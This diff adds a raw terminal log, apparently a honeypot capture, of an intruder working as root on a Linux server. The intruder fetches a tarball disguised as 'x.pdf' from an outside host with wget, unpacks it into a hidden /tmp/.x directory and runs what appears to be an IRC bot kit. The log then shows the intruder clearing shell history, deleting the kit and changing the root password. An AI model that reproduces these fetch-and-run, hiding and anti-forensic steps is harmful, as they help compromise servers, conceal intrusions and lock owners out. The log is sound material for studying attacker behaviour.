@@ -1,0 +1,99 @@
+[4hAWSWeb:~# w
+[4l 16:32:13 up 117 days, 18:36,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    172.158.118.26    16:32    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:~# cd /tmp
+[4l[4hAWSWeb:/tmp# s[1D[1Pls -a
+[4l.         ..        .ICE-unix .X11-unix 
+[4hAWSWeb:/tmp# wget http://i.need.ro/.x/x.pdf;tar zxvf x.pdf;rm -rf x.pdf;cd .x
+[4l--2013-05-22 16:32:28--  http://i.need.ro/.x/x.pdf
+Connecting to i.need.ro:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 268997 (262K) [application/pdf]
+Saving to: `x.pdf
+
+ 0% [>                                      ] 2,561        16K/s  eta 16s96% [=====================================> ] 258,857      390K/s  eta 0s100%[======================================>] 268,997      390K/s
+
+2013-05-22 16:32:29 (390 KB/s) - `x.pdf' saved [268997/268997]
+[4h[4l.x
+.x/r
+.x/r/rtsay.e
+.x/r/rsignoff.e
+.x/r/rpickup.e
+.x/r/raway.e
+.x/r/rversions.e
+.x/r/rsay.e
+.x/r/rinsult.e
+.x/r/rnicks.e
+.x/r/rkicks.e
+.x/inst
+.x/xh
+.x/run
+.x/start
+.x/autorun
+.x/m.help
+.x/crond
+[4h[4l[4h[4l[4hAWSWeb:/tmp/.x# ./start 635d
+[4l=====>Created by PuFoS<=====
+++++++ *Asta e o arhiva privata*  ++++++++
+Exemplu : ./start canal 
+P.S : FARA DIEZ!
+[4hAWSWeb:/tmp/.x# cd
+[4l[4hAWSWeb:~# apt-get install i386-* -y
+[4lReading package lists... Done
+Building dependency tree
+Reading state information... Done
+The following NEW packages will be installed:
+  y i386 
+0 upgraded, 2 newly installed, 0 to remove and 259 not upgraded.
+Need to get 791.2kB of archives.
+After this operation, 1740.2kB of additional disk space will be used.
+Get:1 http://ftp.debian.org stable/main y 1.24-10 [380.2kB]
+Get:2 http://ftp.debian.org stable/main i386 0.23-2 [411.2kB]
+Fetched 791.2kB in 1s (4493B/s)
+Reading package fields... Done
+Reading package status... Done
+(Reading database ... 177887 files and directories currently installed.)
+Unpacking y (from .../archives/y_1.24-10_i386.deb) ...
+Unpacking i386 (from .../archives/i386_0.23-2_i386.deb) ...
+Processing triggers for man-db ...
+Setting up y (1.24-10) ...
+Setting up i386 (0.23-2) ...
+[4hAWSWeb:~# cd[1D[1P[1D[1Pps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:~# cd /tmp
+[4l[4hAWSWeb:/tmp# cd .
+[4l[4hAWSWeb:/tmp# ls -a
+[4l.         ..        .ICE-unix .X11-unix .x        
+[4hAWSWeb:/tmp# .[1D[1Pcd .xx[1D[1P
+[4l[4hAWSWeb:/tmp/.x# ./start 635d
+[4l=====>Created by PuFoS<=====
+++++++ *Asta e o arhiva privata*  ++++++++
+Exemplu : ./start canal 
+P.S : FARA DIEZ!
+[4hAWSWeb:/tmp/.x# 
+AWSWeb:/tmp/.x# cd
+[4l[4hAWSWeb:~# yum install i386-* -y
+bash: yum: command not found
+AWSWeb:~# 
+AWSWeb:~# history -c
+[4l[4hAWSWeb:~# cd /tmp
+[4l[4hAWSWeb:/tmp# ls -a
+[4l.         ..        .ICE-unix .X11-unix .x        
+[4hAWSWeb:/tmp# rm -rf .x
+[4l[4hAWSWeb:/tmp# cd
+[4l[4hAWSWeb:~# passwd
+[4lEnter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+[4hAWSWeb:~# cd
+[4l[4hAWSWeb:~# history -c
+[4l[4hAWSWeb:~# 
